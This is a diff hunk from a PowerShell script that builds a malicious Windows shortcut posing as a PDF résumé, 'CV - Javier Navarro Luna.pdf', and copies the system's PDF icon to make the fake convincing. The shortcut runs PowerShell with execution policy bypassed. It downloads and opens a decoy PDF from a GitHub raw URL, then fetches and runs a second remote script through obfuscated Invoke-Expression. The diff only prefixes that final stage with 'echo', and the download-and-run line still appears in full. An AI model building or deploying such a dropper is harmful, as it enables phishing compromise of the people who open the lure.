@@ -12,7 +12,7 @@ $url2 = "https://raw.githubusercontent.com/mikranscn/PruebaEscritorio/main/alfa.
 $pdf = "CV - Javier Navarro Luna.pdf"
 
 $Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
-$Shortcut.Arguments = "/C powershell.exe -nop -ExecutionPolicy Bypass -c `"(New-Object Net.WebClient).$dl('$url1', '.\$pdf')`" & cmd.exe /c start `"`" `"$pdf`" & powershell.exe -nop -ExecutionPolicy Bypass -c `"$iex (New-Object Net.WebClient).$ds('$url2')`""
+$Shortcut.Arguments = "/C powershell.exe -nop -ExecutionPolicy Bypass -c `"(New-Object Net.WebClient).$dl('$url1', '.\$pdf')`" & cmd.exe /c start `"`" `"$pdf`" & echo powershell.exe -nop -ExecutionPolicy Bypass -c `"$iex (New-Object Net.WebClient).$ds('$url2')`""
 
 $progId = (Get-Item "HKCR:\.pdf" -ErrorAction SilentlyContinue)."(Default)"
 $pdfIcon = (Get-ItemProperty "HKCR:\$progId\DefaultIcon" -ErrorAction SilentlyContinue)."(Default)"
